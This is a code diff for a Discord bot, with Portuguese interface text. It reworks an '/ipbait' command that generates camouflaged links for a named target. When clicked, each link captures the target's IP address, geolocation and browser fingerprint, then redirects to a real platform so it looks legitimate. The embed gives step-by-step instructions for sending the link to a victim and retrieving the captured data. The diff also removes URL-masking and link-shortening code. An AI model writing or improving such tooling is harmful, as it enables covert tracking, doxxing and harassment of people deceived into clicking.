@@ -135,6 +135,15 @@ const attackCooldowns = new Map<string, number>(); // userId → lastLaunchTimes
 const IPBAIT_COOLDOWN_MS = 20_000;
 const ipbaitCooldowns = new Map<string, number>(); // userId → lastUsedTimestamp
 
+// ── Cooldown & session map GC — runs every 10min to prevent unbounded growth ──
+setInterval(() => {
+  const now = Date.now();
+  for (const [uid, ts] of attackCooldowns) if (now - ts > ATTACK_COOLDOWN_MS * 10) attackCooldowns.delete(uid);
+  for (const [uid, ts] of ipbaitCooldowns) if (now - ts > IPBAIT_COOLDOWN_MS * 10) ipbaitCooldowns.delete(uid);
+  // Also clean up any stale pending sessions whose timers may have been missed
+  for (const [uid] of pendingSessions) if (!sessionTimers.has(uid)) pendingSessions.delete(uid);
+}, 10 * 60 * 1000).unref();
+
 const SESSION_TTL_MS = 5 * 60 * 1000; // 5 minutes
 
 function clearSession(userId: string): void {
@@ -498,11 +507,6 @@ const COMMANDS = [
   new SlashCommandBuilder()
     .setName("ipbait")
     .setDescription("🪤 IP Tracker Bait — gera link camuflado para capturar IP (owner/admin only)")
-    .addStringOption(opt =>
-      opt.setName("url")
-        .setDescription("🔗 URL real de destino — o alvo clica e é redirecionado para ela (URL Masking)")
-        .setRequired(false)
-    )
     .addStringOption(opt =>
       opt.setName("theme")
         .setDescription("Aparência do link bait (tema visual da página de carregamento)")
@@ -3025,7 +3029,6 @@ async function handleIpBait(interaction: ChatInputCommandInteraction): Promise<v
   const theme       = interaction.options.getString("theme")  ?? "tiktok";
   const targetUser  = interaction.options.getUser("target");
   const customLabel = interaction.options.getString("label");
-  const redirectUrl = interaction.options.getString("url")?.trim() ?? null;
 
   const targetName = customLabel
     ?? targetUser?.displayName
@@ -3045,20 +3048,6 @@ async function handleIpBait(interaction: ChatInputCommandInteraction): Promise<v
     discord: "https://discord.com/app",
   };
 
-  // Validate redirect URL if provided
-  if (redirectUrl) {
-    try {
-      const u = new URL(redirectUrl);
-      if (u.protocol !== "https:" && u.protocol !== "http:") {
-        await interaction.editReply({ embeds: [buildErrorEmbed("URL INVÁLIDA", "A URL de destino deve começar com `https://` ou `http://`.")] });
-        return;
-      }
-    } catch {
-      await interaction.editReply({ embeds: [buildErrorEmbed("URL INVÁLIDA", "A URL fornecida não é válida. Exemplo: `https://youtube.com/watch?v=xxx`")] });
-      return;
-    }
-  }
-
   try {
     const trackerRes = await fetch(`${API_BASE}/api/tracker/gen`, {
       method: "POST",
@@ -3068,7 +3057,6 @@ async function handleIpBait(interaction: ChatInputCommandInteraction): Promise<v
         username:   targetUser?.username ?? callerName,
         targetName,
         theme,
-        ...(redirectUrl ? { redirectUrl } : {}),
       }),
     });
 
@@ -3077,97 +3065,42 @@ async function handleIpBait(interaction: ChatInputCommandInteraction): Promise<v
       return;
     }
 
-    const genData = await trackerRes.json() as { token: string; url: string; theme: string; redirectUrl?: string };
+    const genData = await trackerRes.json() as { token: string; url: string; theme: string };
     const { token, url } = genData;
-    const themeLabel    = THEME_LABELS[theme] ?? theme.toUpperCase();
-    const effectiveDest = genData.redirectUrl ?? THEME_REDIRECT[theme] ?? "https://discord.com/app";
-    const isMasked      = !!genData.redirectUrl;
+    const themeLabel = THEME_LABELS[theme] ?? theme.toUpperCase();
+    const themeRedirect = THEME_REDIRECT[theme] ?? "https://discord.com/app";
 
-    // ── Shorten the tracker URL via TinyURL (free, no auth required) ─────────
-    let shortUrl: string | null = null;
-    try {
-      const tiny = await fetch(
-        `https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`,
-        { signal: AbortSignal.timeout(5000) },
-      );
-      if (tiny.ok) {
-        const text = (await tiny.text()).trim();
-        if (text.startsWith("https://tinyurl.com/")) shortUrl = text;
-      }
-    } catch { /* non-fatal — short URL is optional */ }
-
-    // ── Build message content (markdown links render here, not in embed fields) ──
-    // [visible text](url) hyperlinks ONLY work in message content & embed description,
-    // NOT in embed field values — that's why we split them here.
-    const contentLines: string[] = [];
-
-    if (isMasked) {
-      // Discord masked link: displays as the real URL, clicks go to tracker
-      contentLines.push(`## 🪤 IP TRACKER — URL MASKING`);
-      contentLines.push(``);
-      contentLines.push(`**💬 Enviar no Discord** *(clica como se fosse o link real)*`);
-      contentLines.push(`> [${effectiveDest}](${url})`);
-    } else {
-      contentLines.push(`## 🪤 IP TRACKER — ${themeLabel}`);
-    }
-
-    if (shortUrl) {
-      contentLines.push(``);
-      contentLines.push(`**📱 Enviar no WhatsApp / Telegram / SMS:**`);
-      contentLines.push(`> ${shortUrl}`);
-    }
-
-    if (!isMasked) {
-      contentLines.push(``);
-      contentLines.push(`**🔗 Link bait:**`);
-      contentLines.push(`> ${url}`);
-    }
-
-    const messageContent = contentLines.join("\n");
-
-    // ── Clean embed — only metadata, no links ─────────────────────────────────
     const embed = new EmbedBuilder()
-      .setColor(isMasked ? 0x00C851 : COLORS.PURPLE)
+      .setColor(COLORS.PURPLE)
+      .setTitle(`🪤 IP TRACKER BAIT — ${themeLabel}`)
+      .setDescription(`*"Cada link é uma armadilha. O Geass captura o que os olhos não veem."*`)
       .addFields(
+        { name: "🎭 Tema",          value: themeLabel,                                                                  inline: true  },
+        { name: "🎯 Alvo",          value: targetUser ? `<@${targetUser.id}> (\`${targetUser.username}\`)` : `*${targetName}*`, inline: true },
+        { name: "🔀 Redireciona",   value: `\`${themeRedirect}\``,                                                     inline: false },
+        { name: "🔗 Link camuflado",value: url,                                                                         inline: false },
+        { name: "🔑 Token",         value: `\`${token}\``,                                                              inline: true  },
+        { name: "⏱️ Gerado",        value: `<t:${Math.floor(Date.now() / 1000)}:R>`,                                   inline: true  },
+        { name: "📊 Ver resultado", value: `\`/panel ipcheck token:${token}\``,                                         inline: false },
         {
-          name: "🎭 Tema visual",
-          value: themeLabel,
-          inline: true,
-        },
-        {
-          name: "🎯 Alvo",
-          value: targetUser ? `<@${targetUser.id}>` : `*${targetName}*`,
-          inline: true,
-        },
-        {
-          name: "🔀 Destino",
-          value: `\`${effectiveDest.length > 50 ? effectiveDest.slice(0, 47) + "..." : effectiveDest}\``,
-          inline: false,
-        },
-        {
-          name: "🔑 Token",
-          value: `\`${token}\``,
-          inline: true,
-        },
-        {
-          name: "⏱️ Gerado",
-          value: `<t:${Math.floor(Date.now() / 1000)}:R>`,
-          inline: true,
-        },
-        {
-          name: "📊 Ver resultado",
-          value: `\`/panel ipcheck token:${token}\``,
+          name: "ℹ️ Como usar",
+          value: [
+            "1️⃣ Copie o **Link camuflado** e envie ao alvo",
+            "2️⃣ Ao clicar, IP + geolocalização + fingerprint são capturados",
+            "3️⃣ O link redireciona para a plataforma — parece legítimo",
+            "4️⃣ Use `/panel ipcheck` com o token para ver os dados",
+          ].join("\n"),
           inline: false,
         },
       )
       .setTimestamp()
-      .setFooter({ text: `${AUTHOR} • Geass Intelligence — IP Tracker v2` });
+      .setFooter({ text: `${AUTHOR} • Geass Intelligence Division — IP Tracker v2` });
 
     if (targetUser?.displayAvatarURL) {
       embed.setThumbnail(targetUser.displayAvatarURL({ size: 256 }));
     }
 
-    await interaction.editReply({ content: messageContent, embeds: [embed] });
+    await interaction.editReply({ embeds: [embed] });
 
     console.log(`[IP TRACKER] 🪤 Bait gerado por ${callerName} (${callerId}) — tema: ${theme} — alvo: ${targetName} — token: ${token.slice(0, 8)}...`);
 
